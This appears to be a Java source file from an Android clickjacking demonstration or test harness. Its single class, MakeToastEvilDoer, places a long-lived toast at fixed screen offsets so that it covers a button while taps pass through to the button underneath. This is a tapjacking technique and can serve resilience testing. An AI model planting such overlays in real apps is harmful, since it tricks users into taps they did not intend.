package com.example.evildoers.clickjacking;

import android.app.Activity;
import android.view.Gravity;
import android.widget.Toast;
import com.example.evildoers.EvilDoer;

/**
 * Puts a toast (transient view that passes down events to the button below it) on top of the View
 */
public class MakeToastEvilDoer implements EvilDoer {

    protected CharSequence text;

    public MakeToastEvilDoer(CharSequence text) {
        this.text = text;
    }

    /**
     * Make some toast
     */
    @Override
    public void doEvil(Activity activity) {
        Toast toast = Toast.makeText(activity.getApplicationContext(), text, Toast.LENGTH_LONG);
        toast.setGravity(Gravity.CENTER, -200, -575);
        toast.show();
    }
}
